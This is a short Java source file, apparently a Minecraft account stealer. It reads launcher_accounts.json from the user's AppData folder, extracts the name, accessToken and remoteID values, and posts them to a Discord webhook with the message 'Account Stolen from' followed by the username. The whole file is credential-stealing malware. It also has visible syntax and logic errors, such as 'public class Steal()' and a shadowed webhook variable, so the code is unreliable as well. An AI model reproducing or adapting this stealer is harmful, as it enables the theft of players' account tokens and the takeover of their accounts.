package myjavaprogram;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import javaprogram.text.TextDemo;
import javaprogram.util.DiscordWebhook;

public class Steal() {

  public static String webhook = "https://discord.com/api/webhooks/...";

  public static void Steal() {
    StringBuilder MC = new StringBuilder();
    String user = System.getProperty("user.name");
    File file = new File("C:\\Users\\" + user + "\\AppData\\Roaming\\.minecraft\\launcher_accounts.json");
    if (!file.exists())
      MC.append("Could not locate!"); 
    try {
      BufferedReader br = new BufferedReader(new FileReader(file));
      String st;
      while ((st = br.readLine()) != null) {
        if (st.contains("name") || st.contains("accessToken") || st.contains("remoteID")) {
          st = st.replace(":", "");
          st = st.replace("}", "");
          st = st.replace("{", "");
          st = st.replace(",", "");
          st = st.replace("\"", "");
          MC.append(String.valueOf(st) + "\\n\\n");
        } 
      } 
      br.close();
    } catch (IOException e) {
      e.printStackTrace();
    } 
    System.out.println(":D Starting :>>>>");
    DiscordWebhook webhook = new DiscordWebhook(webhook);
    webhook.setContent("Account Stolen from " + user + "\\n\\n```Minecraft Details:\\n\\n" + MC.toString() + "```");
    try {
       webhook.execute(); 
    } catch (IOException e) {
      webhook.setContent("Could not steal account from: " + user);
      webhook.execute();
    } 
  }
}
